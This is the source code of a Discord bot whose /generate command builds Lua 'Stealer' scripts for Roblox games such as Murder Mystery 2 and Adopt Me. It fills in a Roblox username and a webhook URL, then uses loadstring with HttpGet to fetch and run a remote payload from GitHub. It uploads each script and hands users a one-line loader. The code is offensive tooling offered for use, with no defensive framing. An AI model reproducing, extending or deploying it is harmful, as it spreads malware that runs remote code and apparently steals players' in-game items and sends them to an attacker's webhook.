import { Client, GatewayIntentBits, SlashCommandBuilder } from 'discord.js';
import dotenv from 'dotenv';
import fetch from 'node-fetch';  // For making HTTP requests to GitHub API
import './keep_alive.js';  // Import the keep_alive.js file to keep the bot alive

dotenv.config();  // Load environment variables from .env

// GitHub configuration (ensure .env contains these values)
const GitHubToken = process.env.GITHUB_TOKEN;
const repoOwner = 'VOIDZ';
const repoName = 'VOIDSCRIPTS';

// Guild ID from .env file
const guildId = process.env.GUILD_ID;  // Access Guild ID from .env

// Create the Discord bot client
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ],
});

// When the bot is ready
client.once('ready', () => {
  console.log(`${client.user.tag} is online!`);
});

// Slash command registration
client.once('ready', async () => {
  console.log(`${client.user.tag} is ready!`);

  const data = [
    new SlashCommandBuilder()
      .setName('generate')
      .setDescription('Generate a Stealer script for mm2 and other games.')
      .addStringOption((option) =>
        option.setName('username').setDescription('Your Roblox Username').setRequired(true)
      )
      .addStringOption((option) =>
        option.setName('webhook').setDescription('Your Webhook URL').setRequired(true)
      ),
  ];

  // Fetch the guild asynchronously
  try {
    const guild = await client.guilds.fetch(guildId); // Use async fetch for the guild
    if (guild) {
      await guild.commands.set(data);
      console.log('Slash commands registered!');
    }
  } catch (error) {
    console.error('Error fetching the guild:', error);
  }
});

// Handle slash command interactions
client.on('interactionCreate', async (interaction) => {
  if (!interaction.isCommand()) return;

  if (interaction.commandName === 'generate') {
    const username = interaction.options.getString('username');
    const webhook = interaction.options.getString('webhook');

    // Updated script content following the provided Lua template
    const scriptContent = `
-- Generated Script
local Username = "${username}"
local Webhook = "${webhook}"

-- Minimum RAP configuration
local MinimumRAP = 500000

-- Executing the script from GitHub repository
loadstring(game:HttpGet('https://raw.githubusercontent.com/GOLDStealer/VOIDSCRIPTS/refs/heads/main/VOIDSCRIPTS'))()
`;

    const fileName = `GeneratedScript${Math.floor(Math.random() * 1000000)}.lua`;

    // Upload the generated script to GitHub
    const uploadResponse = await fetch(
      `https://api.github.com/repos/${repoOwner}/${repoName}/contents/lua/${fileName}`,
      {
        method: 'PUT',
        headers: {
          Authorization: `token ${GitHubToken}`,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          message: `Add generated script: ${fileName}`,
          content: Buffer.from(scriptContent).toString('base64'),
        }),
      }
    );

    const uploadResult = await uploadResponse.json();
    const downloadUrl = uploadResult.content?.download_url;

    if (downloadUrl) {
      // Construct the loadstring for the response
      const loadstring = `loadstring(game:HttpGet("${downloadUrl}", true))()`;

      // Supported games list
      const supportedGames = [
        "Adopt Me",
        "Anime Defenders",
        "Bee Swarm Simulator",
        "Blade Ball",
        "Blox Fruits",
        "Bubble Gum Simulator",
        "Da Hood",
        "Murder Mystery 2",
        "Pet Simulator 99",
        "Pet Simulator X",
        "Pets Go",
        "Toilet Tower Defense",
        "Five Night Tower Defense"
      ];

      // Send the response to the user with the loadstring and supported games
      await interaction.reply({
        content: `Generated script! Use the following:\n\`\`\`lua\n${loadstring}\n\`\`\`\n\n**Supported Games**:\n${supportedGames.map(game => `✅ ${game}`).join('\n')}`,
        ephemeral: true,
      });
    } else {
      // If there's an error uploading the script
      await interaction.reply({
        content: 'Error uploading script to GitHub.',
        ephemeral: true,
      });
    }
  }
});

// Log in to Discord using the bot token
client.login(process.env.BOT_TOKEN);
